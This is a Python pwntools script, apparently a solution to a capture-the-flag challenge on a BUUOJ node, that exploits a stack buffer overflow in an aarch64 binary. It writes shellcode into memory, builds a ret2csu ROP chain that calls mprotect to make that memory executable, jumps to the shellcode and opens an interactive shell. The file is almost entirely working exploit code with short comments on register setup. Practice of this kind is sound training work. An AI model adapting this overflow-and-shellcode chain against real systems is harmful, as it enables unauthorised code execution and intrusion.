from pwn import *
import sys
remote_addr = ["node4.buuoj.cn",25721]
#libc = ELF('')
elf = ELF('./pwn')
if len(sys.argv) == 1:
    # context.log_level="debug" 
    #io = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    # io = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    io = process(["qemu-aarch64-static", "-g", "1234", "./pwn"]) 
    # io = process("")
    context(arch='aarch64', os='linux')
    # context.terminal['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        io = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch='aarch64', os='linux')
        #context(arch = 'amd64', os = 'linux')

csu_2=0x4008CC
# LDP             X19, X20, [SP,#var_s10]
# LDP             X21, X22, [SP,#var_s20]
# LDP             X23, X24, [SP,#var_s30]
# LDP             X29, X30, [SP+var_s0],#0x40
# RET

#RET 跳转的是X30保存的地址，X30存放返回地址

csu_1=0x4008ac
# LDR             X3, [X21,X19,LSL#3]
# MOV             X2, X22
# MOV             X1, X23
# MOV             W0, W24
# ADD             X19, X19, #1
# BLR             X3
# CMP             X19, X20
# B.NE            loc_4008AC



mprotect=elf.plt[b"mprotect"]
# STP             X29, X30, [SP,#-0x10+var_s0]!
# MOV             X29, SP
# MOV             W2, #0                  ; prot
# MOV             X1, #0x1000             ; len
# MOV             X0, #off_411000         ; addr
# BL              .mprotect
# NOP
# LDP             X29, X30, [SP+var_s0],#0x10
# RET


tar_addr=0x411068

io.sendafter(b"Name:",p64(mprotect)+asm(shellcraft.sh()))
# payload=cyclic(0x48)+asm(shellcraft.sh())

payload=cyclic(0x48)+p64(csu_2)
payload+=p64(0)+p64(csu_1) # X19->0 X30->csu_1
payload+=p64(0)+p64(1) # X19->0 X20->1
payload+=p64(tar_addr)+p64(7)+p64(0x1000)+p64(tar_addr+8) # X3->X21->tar_addr X2->X22->7 X1->X23->0x1000 W0->W24(X24)->tar_addr+0x8

payload+=p64(0)+p64(tar_addr+0x8) # mprotect X29->0 X30->tar_addr+0x8

io.sendline(payload)



io.interactive()